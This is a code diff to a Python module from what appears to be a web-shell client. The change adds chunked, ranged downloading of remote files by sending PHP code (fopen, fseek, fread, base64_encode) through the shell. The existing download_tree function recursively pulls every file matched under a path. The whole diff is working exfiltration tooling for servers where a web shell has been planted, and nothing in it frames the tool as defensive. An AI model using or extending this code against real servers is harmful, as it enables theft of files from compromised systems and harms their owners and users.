@@ -90,16 +90,48 @@ def _local_path(ws: WebShell, remote_path: str, output_dir: Path) -> Path:
     return candidate
 
 
-def _download_one(ws: WebShell, remote_path: str, local_path: Path) -> bool:
+DEFAULT_CHUNK = 512 * 1024
+
+
+def _remote_size(ws: WebShell, path: str) -> int:
+    try:
+        return int(ws.run_php(f"echo filesize({php_string(path)})").strip())
+    except (ValueError, WebshellError):
+        return -1
+
+
+def _fetch(ws: WebShell, remote_path: str, chunk_size: int) -> bytes:
+    """Fetch a remote file, reading it in ranges when it's larger than a chunk.
+
+    Avoids base64-encoding a huge file into a single response (which blows PHP's
+    ``memory_limit`` / POST limits and buffers everything in memory).
+    """
+    size = _remote_size(ws, remote_path)
+    if size <= 0 or size <= chunk_size:
+        return base64.b64decode(
+            ws.run_php(f"echo base64_encode(file_get_contents({php_string(remote_path)}))")
+        )
+    parts: list[bytes] = []
+    for offset in log.track(list(range(0, size, chunk_size)), f"↓ {Path(remote_path).name}"):
+        code = (
+            f"$f=fopen({php_string(remote_path)},'rb');fseek($f,{offset});"
+            f"echo base64_encode(fread($f,{chunk_size}));fclose($f)"
+        )
+        parts.append(base64.b64decode(ws.run_php(code)))
+    return b"".join(parts)
+
+
+def _download_one(
+    ws: WebShell, remote_path: str, local_path: Path, chunk_size: int = DEFAULT_CHUNK
+) -> bool:
     """Download a single file, skipping it if an identical copy already exists."""
     if local_path.exists():
         if hash_remote_file(ws, remote_path) == hash_file(local_path):
             log.warning(f"Unchanged, skipping: {remote_path}")
             return True
         log.info(f"Remote changed, re-downloading: {remote_path}")
-    encoded = ws.run_php(f"echo base64_encode(file_get_contents({php_string(remote_path)}))")
     try:
-        data = base64.b64decode(encoded)
+        data = _fetch(ws, remote_path, chunk_size)
     except (ValueError, TypeError) as exc:
         log.error(f"Failed to decode {remote_path}: {exc}")
         return False
@@ -109,14 +141,16 @@ def _download_one(ws: WebShell, remote_path: str, local_path: Path) -> bool:
     return True
 
 
-def download(ws: WebShell, remote_path: str, output_dir: Path) -> None:
-    """Download a single remote file."""
-    _download_one(ws, remote_path, _local_path(ws, remote_path, output_dir))
+def download(
+    ws: WebShell, remote_path: str, output_dir: Path, chunk_size: int = DEFAULT_CHUNK
+) -> None:
+    """Download a single remote file (ranged for large files)."""
+    _download_one(ws, remote_path, _local_path(ws, remote_path, output_dir), chunk_size)
 
 
 def download_tree(
     ws: WebShell, path: str, name_filter: str = "*", find_args: str | None = None,
-    *, output_dir: Path,
+    *, output_dir: Path, chunk_size: int = DEFAULT_CHUNK,
 ) -> None:
     """Recursively download files under ``path``.
 
@@ -135,4 +169,4 @@ def download_tree(
     targets = [line for line in listing.splitlines() if line and not line.startswith("find:")]
     log.info(f"{len(targets)} file(s) to download.")
     for remote_path in log.track(targets, "Downloading"):
-        _download_one(ws, remote_path, _local_path(ws, remote_path, output_dir))
+        _download_one(ws, remote_path, _local_path(ws, remote_path, output_dir), chunk_size)
